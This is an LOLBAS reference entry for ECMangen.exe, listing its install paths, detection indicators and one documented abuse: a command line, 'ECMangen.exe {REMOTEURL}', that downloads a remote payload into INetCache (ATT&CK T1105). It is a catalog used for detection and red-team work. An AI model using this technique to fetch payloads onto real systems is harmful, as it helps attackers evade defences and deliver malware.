---
title: "ECMangen.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/ECMangen/
fetched_at: 2026-09-20T17:14:47Z
license: unspecified
category: windows
---

Command-line tool for managing certificates in Microsoft Exchange Server.

## Paths
- C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe
- C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe
- C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe
- C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe
- C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe
- C:\ExchangeServer\Bin\ECMangen.exe

## Acknowledgements
- Avihay Eldad ([@AvihayEldad](https://twitter.com/@AvihayEldad))

## Detections
- IOC: URL on a ECMangen command line
- IOC: ECMangen making unexpected network connections or DNS requests

## Download

1. Downloads payload from remote server

```
ECMangen.exe {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
